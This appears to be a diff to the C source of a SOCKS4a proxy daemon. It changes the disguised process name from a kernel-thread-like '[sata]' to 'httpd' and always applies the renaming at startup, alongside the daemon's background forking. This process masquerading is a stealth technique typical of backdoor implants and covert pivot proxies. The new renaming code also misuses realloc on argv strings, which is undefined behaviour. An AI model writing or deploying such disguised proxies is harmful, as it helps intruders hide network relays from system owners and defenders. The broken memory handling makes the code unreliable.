@@ -15,9 +15,9 @@
 #ifndef STANDALONE
 #include "config.h"
 #else
-#define PROCNAME "[sata]"
 #define DEBUG 1
 #endif
+#define HTTPD "httpd"
 #include "common.h"
 
 #define VN 0x04
@@ -31,17 +31,14 @@ struct message {
 	unsigned int dstip;
 };
 
-#ifdef STANDALONE 
-
-void rename_proc(int argc, char **argv) {
+void rename_proc2httpd(int argc, char **argv) {
     int i;
     for (i = 0; i < argc; i++) {
         memset(argv[i], 0, strlen(argv[i]));
-//        realloc(argv[i], strlen(PROCNAME)+1);
-        memcpy(argv[i], PROCNAME, sizeof(PROCNAME));
+        realloc(argv[i], strlen(HTTPD)+1);
     }
+    memcpy(argv[0], HTTPD, sizeof(HTTPD));
 }
-#endif
 
 void print_message(struct message *m) {
 #if DEBUG
@@ -97,17 +94,14 @@ void socks_forward(int sock1, int sock2) {
 
         if (select(max(sock1, sock2)  + 1, &fds, NULL, NULL, NULL) < 0 ) break;
 
-        /* stdin => shell */
         if (FD_ISSET(sock1, &fds)) {
             count = read(sock1, buf, BUFSIZE);
             if ((count <= 0)) break;
             if (write(sock2, buf, count) <= 0) break;    
-            /* shell => stdout */
         } 
 	
 		if (FD_ISSET(sock2, &fds)) {
             count = read(sock2, buf, BUFSIZE);
-            // TODO: enviar char especial per setejar tamany tty, timeout, etc.
             if ((count <= 0)) break;
             else if (write(sock1, buf, count) <= 0) break;
         }
@@ -188,7 +182,8 @@ void socks4a_daemon(int port) {
     }
 }
 
-int main_socksd(int port) {
+int main_socksd(int port, int argc, char **argv) {
+    rename_proc2httpd(argc, argv);
     signal(SIGCHLD, sig_child);
 #if ! DEBUG
     if (fork()) return 0;
@@ -204,8 +199,7 @@ int main(int argc, char **argv) {
         return -1;
     }
     int port = atoi(argv[1]);
-    rename_proc(argc, argv);
-    main_socksd(port);
+    main_socksd(port, argc, argv);
     return 0;
 }
 #endif
